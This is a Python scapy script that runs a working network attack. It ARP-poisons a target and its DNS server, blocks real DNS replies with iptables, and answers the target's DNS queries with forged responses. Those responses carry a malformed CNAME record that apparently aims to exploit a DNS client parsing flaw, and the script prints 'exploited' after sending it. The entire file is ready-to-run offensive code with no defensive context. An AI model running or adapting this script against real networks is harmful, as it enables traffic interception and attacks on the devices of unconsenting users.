
from scapy.all import *
from multiprocessing import Process
from binascii import hexlify, unhexlify
import argparse, time, os

def device_setup():
    os.system("echo '1' >> /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -A FORWARD -p UDP --dport 53 -j DROP")

def ARPP(target, dns_server):
    print("[*] Sending poisoned ARP packets")
    target_mac = getmacbyip(target)
    dns_server_mac = getmacbyip(dns_server)
    while True:
        time.sleep(2)
        send(ARP(op=2, pdst=target, psrc=dns_server, hwdst=target_mac),verbose = 0)
        send(ARP(op=2, pdst=dns_server, psrc=target, hwdst=dns_server_mac),verbose = 0)

def exploit(target):
    print("[*] Listening ")
    sniff (filter="udp and port 53 and host " + target, prn = process_received_packet)

"""
RFC schema
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             LENGTH            |               ID              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Q| OPCODE|A|T|R|R|Z|A|C| RCODE |            QDCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            ANCOUNT            |            NSCOUNT            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            ARCOUNT            |               QD              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               AN              |               NS              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|               AR              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Fig. DNS                             

"""
def process_received_packet(received_packet):
    if received_packet[IP].src == target_ip:
        if received_packet.haslayer(DNS):
            if DNSQR in received_packet:
                print("[*] the received packet: " + str(bytes_hex(received_packet)))
                print("[*] the received DNS request: " + str(bytes_hex(received_packet[DNS].build())))
                try:
                    # \/    the received DNS request
                    dns_request = received_packet[DNS].build()
                    null_pointer_index = bytes(received_packet[DNS].build()).find(0x00,12)
                    print("[*] debug: dns_request[:null_pointer_index] : "+str(hexlify(dns_request[:null_pointer_index])))
                    print("[*] debug: dns_request[null_pointer_index:] : "+str(hexlify(dns_request[null_pointer_index:])))
                    payload = [
                        dns_request[0:2],
                        b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00",
                        dns_request[12:null_pointer_index+1],
                        dns_request[null_pointer_index+1:null_pointer_index+3],
                        dns_request[null_pointer_index+3:null_pointer_index+5],
                        b"\xC0\x0C\x00\x05\x00\x01\x00\x00\x0E\x10",
                        b"\x00\x0B\x18\x41\x41\x41\x41\x41\x41\x41",
                        b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",
                        b"\x41\x41\x41\x41\x41\x41\x41\xC0\x04"
                    ]

                    payload = b"".join(payload)
                    spoofed_pkt = (Ether()/IP(dst=received_packet[IP].src, src=received_packet[IP].dst)/ \
                                   UDP(dport=received_packet[UDP].sport, sport=received_packet[UDP].dport)/ \
                                   payload)
                    print("[+] dns answer: "+str(hexlify(payload)))
                    print("[+] full packet: " + str(bytes_hex(spoofed_pkt)))

                    sendp(spoofed_pkt, count=1)
                    print("\n[+] malicious answer was sent")
                    print("[+] exploited\n")
                except:
                    print("\n[-] ERROR")

def main():
    global target_ip
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="IP address of the target")
    parser.add_argument("-r", "--dns_server", help="IP address of the DNS server used by the target")
    args = parser.parse_args()
    target_ip = args.target
    dns_server_ip = args.dns_server
    device_setup()
    processes_list = []
    ARPPProcess = Process(target=ARPP,args=(target_ip,dns_server_ip))
    exploitProcess = Process(target=exploit,args=(target_ip,))
    processes_list.append(ARPPProcess)
    processes_list.append(exploitProcess)
    for process in processes_list:
        process.start()
    for process in processes_list:
        process.join()

if __name__ == '__main__':
    target_ip = ""
    main()